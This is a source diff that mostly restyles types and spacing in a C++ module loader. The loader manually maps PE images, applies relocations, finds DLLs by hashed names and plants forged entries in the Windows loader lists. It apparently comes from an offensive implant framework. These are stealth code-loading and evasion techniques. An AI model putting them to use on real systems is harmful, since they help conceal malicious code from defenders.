@@ -20,7 +20,6 @@ namespace Modules {
             const auto mod = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
             const auto name = mod->BaseDllName;
 
-            // TODO: need checks to prevent overflows tho unlikely
             wchar_t buffer[MAX_PATH] = { };
 
             if (hash - HashStringW(WcsToLower(buffer, name.Buffer), WcsLength(name.Buffer)) == 0) {
@@ -75,6 +74,7 @@ namespace Modules {
 			if (mod->cracked_name) {
 				Free(mod->cracked_name);
 			}
+
 			Free(mod);
 		}
 	}
@@ -221,10 +221,10 @@ namespace Modules {
     VOID InsertTailList(LIST_ENTRY *CONST head, LIST_ENTRY *CONST entry) {
         PLIST_ENTRY blink = head->Blink;
 
-        entry->Flink   = head;
-        entry->Blink   = blink;
-        blink->Flink   = entry;
-        head->Blink	= entry;
+        entry->Flink = head;
+        entry->Blink = blink;
+        blink->Flink = entry;
+        head->Blink	 = entry;
     }
 
     PLIST_ENTRY FindHashTable() {
@@ -493,7 +493,7 @@ namespace Modules {
 
         if (!node->Red) {
             UINT32 length = 0;
-            SIZE_T begin = 0;
+            SIZE_T begin  = 0;
 
             PIMAGE_NT_HEADERS nt_head = RVA(PIMAGE_NT_HEADERS, entry->DllBase, ((PIMAGE_DOS_HEADER) entry->DllBase)->e_lfanew);
             PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_head);
@@ -502,8 +502,8 @@ namespace Modules {
                 UINT32 sec_hash = HashStringA((char*) section->Name, MbsLength((char*) section->Name));
                 UINT32 dot_data = DATA;
 
-                if (MemCompare((void*) &dot_data, (void*) &sec_hash, sizeof(uint32)) == 0) {
-                    begin = (size_t) entry->DllBase + section->VirtualAddress;
+                if (MemCompare((VOID*) &dot_data, (VOID*) &sec_hash, sizeof(UINT32)) == 0) {
+                    begin = (SIZE_T) entry->DllBase + section->VirtualAddress;
                     length = section->Misc.VirtualSize;
                     break;
                 }
@@ -511,10 +511,10 @@ namespace Modules {
                 ++section;
             }
 
-            for (auto i = 0; i < length - sizeof(size_t); ++begin, ++i) {
-                size_t stRet = MemCompare((void *) begin, &node, sizeof(size_t));
+            for (INT i = 0; i < length - sizeof(SIZE_T); ++begin, ++i) {
+                SIZE_T stRet = MemCompare((VOID*) begin, &node, sizeof(SIZE_T));
 
-                if (stRet == sizeof(size_t)) {
+                if (stRet == sizeof(SIZE_T)) {
                     end = begin;
                     break;
                 }
@@ -537,26 +537,25 @@ namespace Modules {
     BOOL MapModule(EXECUTABLE *mod) {
         HEXANE;
 
-		bool success = false;
-
-		UINT_PTR base_rva  = 0;
 		PIMAGE_DATA_DIRECTORY relocdir = nullptr;
+		UINT_PTR base_rva  = 0;
+		BOOL success = false;
 		
 		if (mod->nt_head->Signature != IMAGE_NT_SIGNATURE) {
 			return false;
 		}
 
         mod->base = B_PTR(mod->nt_head->OptionalHeader.ImageBase);
-        mod->base_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
+        mod->base_size = (SIZE_T) mod->nt_head->OptionalHeader.SizeOfImage;
 
-        if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &mod->base_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+        if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &mod->base, 0, &mod->base_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
             U_PTR(mod->base) != mod->nt_head->OptionalHeader.ImageBase) {
 
             mod->base = 0;
             mod->base_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
 
 			// NOTE: test non-prefered image base
-            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &mod->base_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &mod->base, 0, &mod->base_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
 				mod->base_size != mod->nt_head->OptionalHeader.SizeOfImage) {
                 goto defer;
             }
@@ -592,10 +591,10 @@ namespace Modules {
 
                 do {
                     switch (head->Type) {
-                        case IMAGE_REL_BASED_DIR64:   *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
-                        case IMAGE_REL_BASED_HIGHLOW: *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += (uint32) base_rva; break;
-                        case IMAGE_REL_BASED_HIGH:    *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
-                        case IMAGE_REL_BASED_LOW:     *(uint32 *) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
+                        case IMAGE_REL_BASED_DIR64:   *(UINT32*) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += base_rva; break;
+                        case IMAGE_REL_BASED_HIGHLOW: *(UINT32*) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += (UINT32) base_rva; break;
+                        case IMAGE_REL_BASED_HIGH:    *(UINT32*) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_rva); break;
+                        case IMAGE_REL_BASED_LOW:     *(UINT32*) (B_PTR(mod->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_rva); break;
                     }
                     head++;
                 } while (B_PTR(head) != B_PTR(reloc) + reloc->SizeOfBlock);
@@ -610,14 +609,14 @@ namespace Modules {
 	defer:
 		if (!success) {
 			if (mod->base) {
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->base, &mod->base_size, MEM_RELEASE);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->base, &mod->base_size, MEM_RELEASE);
 			}
 		}
 
         return success;
     }
 
-    BOOL AddModuleEntry(PLDR_DATA_TABLE_ENTRY entry, const void *base) {
+    BOOL AddModuleEntry(PLDR_DATA_TABLE_ENTRY entry, CONST VOID *base) {
         HEXANE;
 
         PRTL_RB_TREE index = FindModuleIndex();
@@ -625,8 +624,8 @@ namespace Modules {
             return false;
         }
 
-        bool right_hand = false;
         PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY) ((size_t) index - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
+        BOOL right_hand = false;
 
         do {
             // NOTE: looking for correct in-memory order placement according to RB Tree
@@ -634,15 +633,15 @@ namespace Modules {
                 if (!node->BaseAddressIndexNode.Left) {
                     break;
                 }
+                node = (PLDR_DATA_TABLE_ENTRY) ((SIZE_T) node->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
 
-                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Left - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
             } else if (base > node->DllBase) {
                 if (!node->BaseAddressIndexNode.Right) {
                     right_hand = true;
                     break;
                 }
+                node = (PLDR_DATA_TABLE_ENTRY) ((SIZE_T) node->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
 
-                node = (PLDR_DATA_TABLE_ENTRY) ((size_t) node->BaseAddressIndexNode.Right - offsetof(LDR_DATA_TABLE_ENTRY, BaseAddressIndexNode));
             } else {
                 node->DdagNode->LoadCount++;
             }
@@ -667,13 +666,13 @@ namespace Modules {
             return false;
         }
 
-        mod->local_name = (wchar_t*) Malloc(MAX_PATH);
+        mod->local_name = (WCHAR*) Malloc(MAX_PATH);
         if (!mod->local_name) {
             goto defer;
         }
 
-		MemCopy(B_PTR(filename), (char*)sys32, sizeof(sys32));
-		WcsConcat(filename, (wchar_t*)dot_dll);
+		MemCopy(B_PTR(filename), (PCHAR)sys32, sizeof(sys32));
+		WcsConcat(filename, (WCHAR*)dot_dll);
 
 		handle = ctx->win32.FindFirstFileW(filename, &data);
 		if (INVALID_HANDLE_VALUE == handle) {
@@ -686,7 +685,7 @@ namespace Modules {
 			} else {
 				if (HashStringW(data.cFileName, WcsLength(data.cFileName)) - name_hash == 0) {
 					MemSet(filename, 0, MAX_PATH);
-					MemCopy(filename, data.cFileName, WcsLength(data.cFileName) * sizeof(wchar_t));
+					MemCopy(filename, data.cFileName, WcsLength(data.cFileName) * sizeof(WCHAR));
 				}
 			}
 		} while (ctx->win32.FindNextFileW(handle, &data) != 0);
@@ -695,15 +694,15 @@ namespace Modules {
 			goto defer;
 		}
 
-		MemCopy(B_PTR(mod->local_name), (char*)sys32, sizeof(sys32));
-		WcsConcat(mod->local_name, (wchar_t*)filename);
+		MemCopy(B_PTR(mod->local_name), (CHAR*)sys32, sizeof(sys32));
+		WcsConcat(mod->local_name, (WCHAR*)filename);
 
-        mod->cracked_name = (wchar_t*) Malloc(WcsLength(filename) * sizeof(wchar_t) + 1);
+        mod->cracked_name = (WCHAR*) Malloc(WcsLength(filename) * sizeof(WCHAR) + 1);
 		if (!mod->cracked_name) {
 			goto defer;
 		}
 
-		MemCopy(mod->cracked_name, filename, WcsLength(filename) * sizeof(wchar_t) + 1);
+		MemCopy(mod->cracked_name, filename, WcsLength(filename) * sizeof(WCHAR) + 1);
 		success = true;
 
 	defer:
@@ -781,7 +780,7 @@ namespace Modules {
         entry->BaseNameHashValue = LdrHashEntry(entry->BaseDllName, false);
 
         // correctly add the base address to the entry
-        AddModuleEntry(entry, (void *) mod->base);
+        AddModuleEntry(entry, (LPVOID) mod->base);
 
         // and the rest
         entry->ImageDll = true;
@@ -791,11 +790,11 @@ namespace Modules {
         entry->InIndexes      = true;
         entry->ProcessAttachCalled = true;
         entry->InExceptionTable    = false;
-        entry->DllBase     = (void*) mod->base;
-        entry->SizeOfImage = mod->nt_head->OptionalHeader.SizeOfImage;
+        entry->DllBase       = (LPVOID)mod->base;
+        entry->SizeOfImage   = mod->nt_head->OptionalHeader.SizeOfImage;
         entry->TimeDateStamp = mod->nt_head->FileHeader.TimeDateStamp;
-        entry->BaseDllName = base_name;
-        entry->FullDllName = full_name;
+        entry->BaseDllName   = base_name;
+        entry->FullDllName   = full_name;
         entry->ObsoleteLoadCount = 1;
         entry->Flags = LDRP_IMAGE_DLL | LDRP_ENTRY_INSERTED | LDRP_ENTRY_PROCESSED | LDRP_PROCESS_ATTACH_CALLED;
 
@@ -906,7 +905,6 @@ namespace Modules {
 
         defer:
 		if (!mod->success) {
-			// NOTE: DestroyModule might be trying to free INVALID_HANDLE_VALUE
 			DestroyModule(mod);
 
 			mod->buffer = nullptr;
@@ -914,7 +912,7 @@ namespace Modules {
 		}
 		if (!cache) {
 			if (mod->buffer) {
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->buffer, &mod->buf_size, MEM_RELEASE);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &mod->buf_size, MEM_RELEASE);
 				mod->buffer = nullptr;
 			}
 		}
